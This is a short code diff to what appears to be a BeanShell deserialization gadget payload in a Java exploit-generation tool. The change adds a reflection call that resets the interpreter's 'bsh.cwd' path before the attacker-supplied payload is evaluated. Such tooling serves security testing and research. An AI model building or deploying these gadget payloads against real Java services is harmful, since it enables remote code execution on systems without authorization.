@@ -4,6 +4,7 @@ import bsh.Interpreter;
 import bsh.XThis;
 
 import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
 import java.util.Arrays;
 import java.util.Comparator;
@@ -36,6 +37,10 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
 
 	// Create Interpreter
 	Interpreter i = new Interpreter();
+	// Clear current running path information
+    Method setu = i.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
+    setu.setAccessible(true);
+    setu.invoke(i,new Object[]{"bsh.cwd","."});
 
 	// Evaluate payload
 	i.eval(payload);
